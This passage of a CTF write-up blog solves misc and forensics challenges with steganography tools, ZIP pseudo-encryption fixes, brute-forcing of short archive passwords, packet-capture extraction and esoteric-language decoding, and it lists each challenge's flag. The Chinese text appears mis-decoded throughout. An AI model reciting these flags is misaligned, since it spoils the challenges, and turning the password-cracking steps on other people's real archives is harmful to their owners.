class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œæ¨¡æ¿æŠ¥é”™ <code>Missing End of File marker</code>ï¼Œå‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰æ•°æ®ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01101011011011110110010101101011011010100011001101110011</span><br></pre></td></tr></table></figure><p>å°†å…¶å†™ä½œå…«ä½ä¸€ç»„ä¹‹åè½¬ ASCII å¯å¾— <code>koekj3s</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;koekj3s&#125;</span><br></pre></td></tr></table></figure><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>StegSolve è§£ LSB éšå†™å¯å‘ç°ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884441462/4628fa03026c3213f55f585890e7f837709c3eca.png"></p><p>ä¿å­˜ä¸‹æ¥å¹¶å»æ‰æœ«å°¾çš„å†—ä½™æ•°æ®ï¼Œè§£å‹å¾—åˆ°ä¸€ä¸ª ELF æ–‡ä»¶ã€‚ä½¿ç”¨ Linux ç»ˆç«¯è¿è¡Œå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</span><br></pre></td></tr></table></figure><h3 id="éšè—çš„é’¥åŒ™"><a href="#éšè—çš„é’¥åŒ™" class="headerlink" title="éšè—çš„é’¥åŒ™"></a>éšè—çš„é’¥åŒ™</h3><p>010 editor æ‰“å¼€æ–‡ä»¶å¯è§ flag æç¤ºã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884569178/e5d908b72438bfabe7269e4e5a9134f0e622eac3.png"></p><p>æå–å‡ºæ¥ä¹‹å base64 è§£ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"><a href="#å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜" class="headerlink" title="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"></a>å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜</h3><p>å›¾ç‰‡ä¸­çš„ç›²æ–‡æ ¹æ®å¯¹ç…§è¡¨è§£å‡ºä¸º <code>kmdonowg</code>ã€‚å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å¯†éŸ³é¢‘æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884643132/37bbaf752504944bdc5eeac8f4829874ddff3b6c.png"></p><p>è§£å‹éŸ³é¢‘åå¯ç”„åˆ«æ˜¯æ‘©æ–¯ç”µç ï¼Œä½¿ç”¨ CwGet æ¥æ”¶å¯å¾—æ–‡æœ¬ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884770876/70d0bddf5a6c5a68ff8f90c1208d46d6b30ab141.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wpei08732?23dz&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¥ç§˜é¾™å·é£"><a href="#ç¥ç§˜é¾™å·é£" class="headerlink" title="ç¥ç§˜é¾™å·é£"></a>ç¥ç§˜é¾™å·é£</h3><p>æ ¹æ®é¢˜ç›®æè¿°å¯çŸ¥å‹ç¼©åŒ…çš„å¯†ç ä¸ºå››ä½æ•°å­—ã€‚ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  5463ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213884856876/a44ec42d6b7a8c54d53344aa20492212238d91d8.png"></p><p>è§£å‹å‡ºæ¥å‘ç°ä¸€ä¸ªæ–‡æœ¬ï¼Œä½¿ç”¨ Brainfuck è§£ç ä¹‹åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</span><br></pre></td></tr></table></figure><h3 id="åé—¨æŸ¥æ€"><a href="#åé—¨æŸ¥æ€" class="headerlink" title="åé—¨æŸ¥æ€"></a>åé—¨æŸ¥æ€</h3><p>ä¸‹è½½ä»£ç ä¸‹æ¥å®¡è®¡ï¼Œå‘ç°å¦‚ä¸‹ä¸€è¡Œã€‚<code>$pass = &#39;6ac45fb83b3bc355c024f5034b947dd3&#39;; //angel</code> ç›´æ¥å–å‡ºå­—ç¬¦ä¸²å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</span><br></pre></td></tr></table></figure><h3 id="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"><a href="#è·å…°å®½å¸¦æ•°æ®æ³„éœ²" class="headerlink" title="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"></a>è·å…°å®½å¸¦æ•°æ®æ³„éœ²</h3><p>.bin æ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯è·¯ç”±å™¨é…ç½®æ–‡ä»¶ã€‚ä½¿ç”¨ RouterPassView æŸ¥çœ‹ï¼Œå°è¯•ä¹‹åå‘ç°ç”¨æˆ·åå­—æ®µä¸º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885025608/e64adb11a27ac3c13fd3154adb4a5a8264abc4c1.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;053700357621&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¥é¦–æ­Œå§"><a href="#æ¥é¦–æ­Œå§" class="headerlink" title="æ¥é¦–æ­Œå§"></a>æ¥é¦–æ­Œå§</h3><p>æ‰“å¼€éŸ³é¢‘æ–‡ä»¶ï¼Œå‘ç°ä¸­é—´å¤¹æ‚ç€è«æ–¯ç”µç ï¼Œä½¿ç”¨ CwGet æ¥æ”¶ï¼Œå¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885182886/14155fa0c7506586593a582774124c06e8b0ba13.png"></p><p>å›¾ä¸Šç¬¬ä¸€ä¸ªå­—ç¬¦æœ‰è¯¯ï¼ŒéŸ³é¢‘ä¸­ä¸º <code>.....</code> åº”ä¸º <code>5</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5BC925649CB0188F52E617D70929191C&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"><a href="#æ•°æ®åŒ…ä¸­çš„çº¿ç´¢" class="headerlink" title="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"></a>æ•°æ®åŒ…ä¸­çš„çº¿ç´¢</h3><p>Wireshark åˆ†ææ•°æ®åŒ…ï¼Œè¿½è¸ª TCP æµï¼Œå¯ä»¥å‘ç° base64 æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885296634/698d13942fd0608d192438996a7b9e30d9c02127.png"></p><p>å°†å…¶å‰åå†—ä½™æ•°æ®å»é™¤ååŠ ä¸Š <code>data:image/jpeg;base64,</code> å¯ä»¥è§£ç æˆå›¾ç‰‡ï¼Œä»è€Œå¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885470839/b6f44fde5d1030d302e445779e2e03435759b546.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;209acebf6324a09671abc31c869de72c&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¹è¿ç¯"><a href="#ä¹è¿ç¯" class="headerlink" title="ä¹è¿ç¯"></a>ä¹è¿ç¯</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885549935/0f0d129a115414c7dabf5029c2aa6671517f9705.png"></p><p><code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œå¾—åˆ°å¥—å¨ƒçš„ä¸¤ä¸ªå‹ç¼©æ–‡ä»¶ã€‚ç¬¬äºŒå±‚çš„å›¾ç‰‡è¢«åŠ å¯†äº†ï¼Œæ‰¾ä¸åˆ°å…¶ä»–ä¿¡æ¯ï¼ŒçŒœæµ‹æ˜¯ä¼ªåŠ å¯†ã€‚ä¿®æ”¹ <code>14 00 01 08</code> ä¸º <code>14 00 00 08</code> æˆåŠŸè§£å‹å‡ºå›¾ç‰‡ã€‚</p><p>ç„¶å jpg å›¾ç‰‡çœ‹éšå†™ï¼ŒStegHide æˆåŠŸè§£å‡º secretï¼Œå¾—åˆ°ç¬¬ä¸‰å±‚å‹ç¼©åŒ…å¯†ç  <code>bV1g6t5wZDJif^J7</code>ã€‚</p><p>è§£å‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢å…·ä¸‹çš„flag"><a href="#é¢å…·ä¸‹çš„flag" class="headerlink" title="é¢å…·ä¸‹çš„flag"></a>é¢å…·ä¸‹çš„flag</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885666559/b0d6e19e7d50289e7176ddfd1fb914e1461cd13c.png"></p><p><code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œå¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©æ–‡æ¡£ã€‚åˆ†æä¹‹åå¯çŸ¥æ˜¯ä¼ªåŠ å¯†ï¼Œä¿®æ­£ä¹‹åè§£å‹å¾—åˆ°è™šæ‹Ÿç£ç›˜æ–‡ä»¶ã€‚ä½¿ç”¨ <code>7z x flag.vmdk</code> è§£å‹å¹¶é‡å‘½å <code>NUL</code> æ–‡ä»¶ä¹‹åå¯ä»¥å¾—åˆ°ä¸¤ç«¯æ–‡æœ¬ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----</span><br><span class="line">&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++</span><br><span class="line">++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure><p>åˆ†åˆ«å°†å…¶ä½¿ç”¨ Brainfuck å’Œ Ook! è§£ç ä¹‹åå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;N7F5_AD5_i5_funny!&#125;</span><br></pre></td></tr></table></figure><h3 id="webshellåé—¨"><a href="#webshellåé—¨" class="headerlink" title="webshellåé—¨"></a>webshellåé—¨</h3><p>è·Ÿä¹‹å‰çš„åé—¨æŸ¥æ€ä¸€æ ·ï¼Œæ‰¾åˆ° <code>$pass = &#39;ba8e6c6f35a53933b871480bb9a9545c&#39;; //angel</code> å³å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125;</span><br></pre></td></tr></table></figure><h3 id="è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"><a href="#è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©" class="headerlink" title="è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"></a>è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©</h3><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ï¼Œç­›é€‰ http æ¡ç›®ï¼Œæ‰¾åˆ°å”¯ä¸€çš„ POST è¯·æ±‚ï¼Œå³å¯å¾—åˆ°è´¦å·å¯†ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885841292/80cf7ab7079293a2845d161ab3307f5b3cc868c3.png"></p><p>æ ¹æ®æç¤ºå°†å¸å·å¯†ç ä¸²èµ·æ¥å† MD5 ä¸€æ¬¡å³å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ·æ–°è¿‡çš„å›¾ç‰‡"><a href="#åˆ·æ–°è¿‡çš„å›¾ç‰‡" class="headerlink" title="åˆ·æ–°è¿‡çš„å›¾ç‰‡"></a>åˆ·æ–°è¿‡çš„å›¾ç‰‡</h3><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ ¹æ®æš—ç¤ºå°è¯• F5 éšå†™ã€‚<code>java Extract .\Misc.jpg</code> è§£å¾—ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚åˆ†æåä¸ºä¼ªåŠ å¯†ï¼Œå°† <code>deFlag</code> å¤„æ”¹ä¸º <code>00 00</code> å³å¯è§£å‹å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;96efd0a2037d06f34199e921079778ee&#125;</span><br></pre></td></tr></table></figure><h3 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885940662/e8c5f8bcb0e66cc06a256cbf1afcd7426317043e.png"></p><p><code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œè§£å‹å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ã€‚å°† key æ–‡ä»¶ä¸­çš„ base64 è§£ç å¾—åˆ°å¦‚ä¸‹æ–‡æœ¬ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is Nicki Minaj&#39;s favorite song that refers to snakes?</span><br></pre></td></tr></table></figure><p>æœç´¢ä¹‹åå¯å¾— key ä¸º <code>anaconda</code>ã€‚æ ¹æ®é¢˜ç›®æš—ç¤ºå¯çŸ¥åŠ å¯†æ–¹å¼æ˜¯ Serpentï¼Œä½¿ç”¨å¯¹åº”è§£å¯†å·¥å…·è§£å¯†å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;who_knew_serpent_cipher_existed&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥"><a href="#æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥" class="headerlink" title="æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥"></a>æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥</h3><p>010 editor æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°å…¶å°¾éƒ¨æœ‰æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213885940662/e8c5f8bcb0e66cc06a256cbf1afcd7426317043e.png"></p><p>å¤åˆ¶å‡ºæ¥ä¹‹åç”¨åå…­è¿›åˆ¶è½¬ ASCII å¯ä»¥å¾—åˆ°ä¸€äº›åæ ‡ç‚¹ï¼Œå°†å…¶å¤„ç†æˆ csv æ ¼å¼çš„æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886168220/f4f05764291e92930acf02767a8b1ce6680d4c18.png"></p><p>ä½¿ç”¨ Excel ç”»å‡ºæ•£ç‚¹å›¾ï¼Œå¯ä»¥å¾—å‡ºä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886342936/c2a37e4b2a9f7810d2bababdcae1d08a5f0284c2.png"></p><p>æ‰«æå³å¯å¾—å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</span><br></pre></td></tr></table></figure><h3 id="èœåˆ€666"><a href="#èœåˆ€666" class="headerlink" title="èœåˆ€666"></a>èœåˆ€666</h3><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ï¼Œè¿½è¸ª TCP æµå¯çŸ¥é“ flag åœ¨ä¸€ä¸ªå‹ç¼©åŒ…å†…ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886504913/53d195ec1f83ca7885a647377a72ae4552376f3b.png"></p><p><code>binwalk -e</code> åˆ†ç¦»å‡ºæ¥ï¼Œå‘ç°éœ€è¦å¯†ç ã€‚å›åˆ° TCP æµçš„è·Ÿè¸ªä¸­å¯ä»¥å‘ç°ä¸€å¼ å›¾ç‰‡çš„ä¼ è¾“ï¼Œå°†å…¶æå–å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886730345/7fe607292709030eeb34ceff8017a544dc4a799b.png"></p><p>å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç ï¼Œè§£å‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure><h3 id="è¢«å·èµ°çš„æ–‡ä»¶"><a href="#è¢«å·èµ°çš„æ–‡ä»¶" class="headerlink" title="è¢«å·èµ°çš„æ–‡ä»¶"></a>è¢«å·èµ°çš„æ–‡ä»¶</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œè·Ÿè¸ª TCP æµï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886850073/f57e98db89b45351f410faa09cbc691a5c39d229.png"></p><p>å°†å…¶ä¿å­˜ä¸‹æ¥ç„¶åä½¿ç”¨ ARCHPR çˆ†ç ´å¾—å‡ºè§£å‹å¯†ç ä¸º 5790ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886929674/1e7e180ae53beaf41947f5fe56abe0bfcbd2dd7c.png"></p><p>è§£å‹æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†"><a href="#BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†" class="headerlink" title="[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†"></a>[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†</h3><p>è§£å‹åå¾—åˆ° xls æ–‡ä»¶ï¼Œ010 editor æ‰“å¼€å¯è§å¦‚ä¸‹æç¤ºã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213886994336/a50c2318bd6aa0ad8f5040b5b64c7a9707532e2b.png"></p><p>å°†åç¼€åæ”¹ä¸º  zip æ‰“å¼€åæ‰¾åˆ° <code>../charts/flag.txt</code>ï¼Œæ‰“å¼€å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;M9eVfi2Pcs#&#125;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-è—è—è—"><a href="#BJDCTF2020-è—è—è—" class="headerlink" title="[BJDCTF2020]è—è—è—"></a>[BJDCTF2020]è—è—è—</h3><p>foremost ä»å›¾ç‰‡ä¸­åˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œæ‰“å¼€åå¯ä»¥å¾—åˆ°ä¸€ä¸ª Word æ–‡æ¡£ï¼Œæ‰“å¼€åå¯å¾—ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213887081820/0c3f0446382396b482aaebea8699e03e822b110a.png"></p><p>æ‰«æäºŒç»´ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_are_the_best!&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-ä½›ç³»é’å¹´"><a href="#GXYCTF2019-ä½›ç³»é’å¹´" class="headerlink" title="[GXYCTF2019]ä½›ç³»é’å¹´"></a>[GXYCTF2019]ä½›ç³»é’å¹´</h3><p>é™„åŠ å‹ç¼©æ–‡æ¡£å­˜åœ¨ä¼ªåŠ å¯†ï¼Œä¿®æ­£ä¹‹åè§£å‹å¯å¾—ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ã€‚åœ¨å…¶ä¸­æœ‰å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 